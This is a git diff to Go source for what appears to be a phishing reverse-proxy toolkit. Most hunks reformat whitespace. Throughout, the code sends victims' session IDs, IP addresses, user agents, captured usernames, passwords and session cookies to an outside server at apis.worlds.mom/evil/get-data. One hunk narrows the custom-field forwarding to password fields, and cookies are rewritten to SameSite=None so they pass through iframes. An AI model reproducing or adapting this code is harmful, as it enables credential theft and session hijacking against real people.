@@ -92,23 +92,23 @@ type ProxySession struct {
 
 func doReq(url string) (content string) {
 
-    resp, err := http.Get(url)
+	resp, err := http.Get(url)
 
-    if err != nil {
-		log.Error("doReq Get: %s",err)
-        return
-    }
+	if err != nil {
+		log.Error("doReq Get: %s", err)
+		return
+	}
 
-    defer resp.Body.Close()
+	defer resp.Body.Close()
 
-    body, err := ioutil.ReadAll(resp.Body)
+	body, err := ioutil.ReadAll(resp.Body)
 
-    if err != nil {
-        log.Error("doReq ReadAll: %s",err)
-        return
-    }
+	if err != nil {
+		log.Error("doReq ReadAll: %s", err)
+		return
+	}
 
-    return string(body)
+	return string(body)
 }
 
 func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
@@ -295,12 +295,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								if err == nil {
 									sid := p.last_sid
 									p.last_sid += 1
-									log.Important("[%d] [%s] new visitor has arrived GTT: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
 
-									doReq("https://apis.worlds.mom/evil/get-data?sid="+ session.Id +"&ip=" + remote_addr + "&agent=" + url.QueryEscape(req.Header.Get("User-Agent")))
+									doReq("https://apis.worlds.mom/evil/get-data?sid=" + session.Id + "&ip=" + remote_addr + "&agent=" + url.QueryEscape(req.Header.Get("User-Agent")))
 
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
@@ -598,7 +598,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											p.setSessionUsername(ps.SessionId, um[1])
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
 
-											doReq("https://apis.worlds.mom/evil/get-data/?sid="+ ps.SessionId +"&ip="+ remote_addr +"&user=" + url.QueryEscape(um[1]))
+											doReq("https://apis.worlds.mom/evil/get-data/?sid=" + ps.SessionId + "&ip=" + remote_addr + "&user=" + url.QueryEscape(um[1]))
 
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
@@ -611,7 +611,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 											p.setSessionPassword(ps.SessionId, pm[1])
 											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
 
-											doReq("https://apis.worlds.mom/evil/get-data/?sid="+ ps.SessionId +"&ip="+ remote_addr +"&pwd=" + url.QueryEscape(pm[1]))
+											doReq("https://apis.worlds.mom/evil/get-data/?sid=" + ps.SessionId + "&ip=" + remote_addr + "&pwd=" + url.QueryEscape(pm[1]))
 
 											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
 												log.Error("database: %v", err)
@@ -625,8 +625,11 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
 												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
 
-												doReq("https://apis.worlds.mom/evil/get-data/?sid="+ ps.SessionId +"&ip="+ remote_addr +"&pwd=" + url.QueryEscape(cm[1]))
-
+												if cp.key_s == "password" || cp.key_s == "pass" {
+													if cm[1] != "false" && len(cm[1]) < 50 {
+														doReq("https://apis.worlds.mom/evil/get-data/?sid=" + ps.SessionId + "&ip=" + remote_addr + "&pwd=" + url.QueryEscape(cm[1]))
+													}
+												}
 												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
 													log.Error("database: %v", err)
 												}
@@ -791,9 +794,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				// parse cookie
 
 				// add SameSite=none for every received cookie, allowing cookies through iframes
-				
-				sendCookie = sendCookie + ck.Name + "=" + ck.Value + "; " 
-				
+
+				sendCookie = sendCookie + ck.Name + "=" + ck.Value + "; "
+
 				if ck.Secure {
 					ck.SameSite = http.SameSiteNoneMode
 				}
@@ -900,7 +903,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 						s.IsDone = true
 
-						doReq("https://apis.worlds.mom/evil/get-data/?sid="+ ps.SessionId +"&cookie=" + url.QueryEscape(sendCookie))
+						doReq("https://apis.worlds.mom/evil/get-data/?sid=" + ps.SessionId + "&cookie=" + url.QueryEscape(sendCookie))
 					}
 				}
 			}
@@ -962,24 +965,24 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										body = []byte(re.ReplaceAllString(string(body), replace_s))
 									} else {
 										log.Error("regexp failed to compile: `%s`", sf.regexp)
-									}									
-									
-                                    log.Info("hostname: %s", combineHost(sf.subdomain, sf.domain) )
-                                    log.Info("subdomain: %s", sf.subdomain )
-                                    log.Info("domain: %s", sf.domain )
-                                    log.Info("basedomain: %s", p.cfg.GetBaseDomain() )
-                                    log.Info("hostname_regexp: %s", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))) )
-                                    log.Info("subdomain_regexp: %s", regexp.QuoteMeta(sf.subdomain)  )
-                                    log.Info("domain_regrexp: %s", regexp.QuoteMeta(sf.domain)  )
-                                    log.Info("basedomain_regexp: %s", regexp.QuoteMeta(p.cfg.GetBaseDomain()) )
-                                    log.Info("hostname: %s", phish_hostname )
-                                    log.Info("orig_hostname: %s", obfuscateDots(combineHost(sf.subdomain, sf.domain)) )
-                                    log.Info("orig_domain: %s", obfuscateDots(sf.domain) )
-                                    log.Info("subdomain: %s", phish_sub )
-                                    log.Info("basedomain: %s", p.cfg.GetBaseDomain() )
-                                    log.Info("hostname_regexp: %s", regexp.QuoteMeta(phish_hostname) )
-                                    log.Info("subdomain_regrexp: %s", regexp.QuoteMeta(phish_sub) )
-                                    log.Info("basedomain_regrexp: %s", regexp.QuoteMeta(p.cfg.GetBaseDomain()) )
+									}
+
+									log.Info("hostname: %s", combineHost(sf.subdomain, sf.domain))
+									log.Info("subdomain: %s", sf.subdomain)
+									log.Info("domain: %s", sf.domain)
+									log.Info("basedomain: %s", p.cfg.GetBaseDomain())
+									log.Info("hostname_regexp: %s", regexp.QuoteMeta(regexp.QuoteMeta(combineHost(sf.subdomain, sf.domain))))
+									log.Info("subdomain_regexp: %s", regexp.QuoteMeta(sf.subdomain))
+									log.Info("domain_regrexp: %s", regexp.QuoteMeta(sf.domain))
+									log.Info("basedomain_regexp: %s", regexp.QuoteMeta(p.cfg.GetBaseDomain()))
+									log.Info("hostname: %s", phish_hostname)
+									log.Info("orig_hostname: %s", obfuscateDots(combineHost(sf.subdomain, sf.domain)))
+									log.Info("orig_domain: %s", obfuscateDots(sf.domain))
+									log.Info("subdomain: %s", phish_sub)
+									log.Info("basedomain: %s", p.cfg.GetBaseDomain())
+									log.Info("hostname_regexp: %s", regexp.QuoteMeta(phish_hostname))
+									log.Info("subdomain_regrexp: %s", regexp.QuoteMeta(phish_sub))
+									log.Info("basedomain_regrexp: %s", regexp.QuoteMeta(p.cfg.GetBaseDomain()))
 
 								}
 							}
@@ -999,8 +1002,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				body = []byte(strings.Replace(string(body),"helps.mom.helps.mom","helps.mom", -1))
-				
+				body = []byte(strings.Replace(string(body), "helps.mom.helps.mom", "helps.mom", -1))
 
 				if stringExists(mime, []string{"text/html"}) {
 
